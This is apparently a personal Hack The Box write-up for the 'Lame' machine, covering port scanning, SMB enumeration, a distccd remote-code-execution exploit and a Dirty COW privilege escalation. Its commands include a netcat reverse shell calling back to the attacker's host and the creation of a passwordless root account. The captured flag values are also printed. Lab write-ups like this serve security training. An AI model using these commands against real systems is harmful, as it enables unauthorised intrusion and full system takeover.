---
creation date: May 27th 2023
last modified date: May 27th 2023
aliases: []
tags: #🎌
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[HTB - Lame]]  


# Resolution summary
- Both exploits are very common and known
- Weird issues with not being able to switch users with `su` command but was able to use a work around with `FTP`

## Improved skills
- Enumeration
- Compiling C Scripts 

## Used tools
- [[nmap]]
- [[searchsploit]]
-  [[FTP]]

---

# Information Gathering
Scanned all TCP ports:
```bash
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.30
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-05-28T00:29:09-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m25s, deviation: 2h49m44s, median: 23s
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 445 SMB
```bash
┌──(snape㉿Hogwarts)-[~/CTF/HTB/Lame]
└─$ smbclient -N -L //10.129.127.104 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
```


---

# Exploitation
## distccd CVE-2004-2687
- Located an exploit written not using Metasploit that allows RCE
1. Pulled exploit from Github
```bash
wget https://gist.githubusercontent.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855/raw/261b638bb05d02b67b6ad67fa9cf3c74a73de6c6/distccd_rce_CVE-2004-2687.py && mv distccd_rce_CVE-2004-2687.py exploit.py
```
2. Turned exploit into an executable with:
```bash
chmod +x exploit.py
```
3. Ran script as a test to see if we get access:
```bash
python2 exploit.py -t 10.129.127.104 -p 3632 -c "id"
```
- Note script says it should run with Python3 but doing so kept failing for me trying Python2 worked!!
4. Started a Listener:
```bash
sudo rlwrap nc -lvnp 3333
```
5. Finally lets tell the victims machine to call back to us with a shell:
```bash
python2 exploit.py -t 10.129.127.104 -p 3632 -c "nc 10.10.14.30 3333 -e /bin/sh"
```
6. Success we have a shell now we upgrade it to make it a bit more functional:
```bash
python -c 'import pty;pty.spawn("/bin/bash")' # Run in the shell
export TERM=xterm-256color # whatever your original $TERM value is && Run in shell
ctrl + z
stty raw -echo ;fg # Run on our machine
```





---

# Lateral Movement to user
## Local Enumeration
- Found a user.txt file under 

## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration
- Running `uname -a` shows the kernel version is vuln to **Dirty Cow** exploit!!

## Privilege Escalation vector
### Dirty Cow
- Want to avoid using Metasploit so searching came across the following exploit that creates a new root user named `firefart`
1. Start by downloading the exploit to our machine:
```bash
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
```
2. Next we need to get this onto the victim testing we do have access to `wget` on the victims machine so we start python server from our machine and pull it to the victim:
```bash
python3 -m http.server 9000
```
&&
```bash
wget http://10.10.10.10:9000/dirty.c
```
3. Now we need to compile this on the victims machine the script itself gives us in the notes what [[GCC]] command to use:
```bash
gcc -pthread dirty.c -o dirty -lcrypt
```
4. Final pre-step is to set this file to executable:
```bash
chmod +x dirty
```
5. Now we run this payload and pass it nothing for a password so we don't need one when signing into our new root user:
```bash
./dirty
```
- Note this might take a few minutes to complete and will look like the following when it completes give it time:
```bash
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 

Complete line:
firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash

mmap: b7f04000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```
6. Normally we would switch users at this point but the `su firefart` wasn't working for me when I tried it would never bring the prompt up.
7. Instead went with the **FTP** port we found open earlier using our new account to sign into that worked perfect. Pulled the **root.txt** file onto our machine and finally full exploited the machine.


---

# Trophy & Loot
user.txt = **59011bfdd428761aca6a3654f89a82a7**
root.txt = **5b4f71400043a9f54a0d45c6b7689943**

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: May 27th 2023 (11:46 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
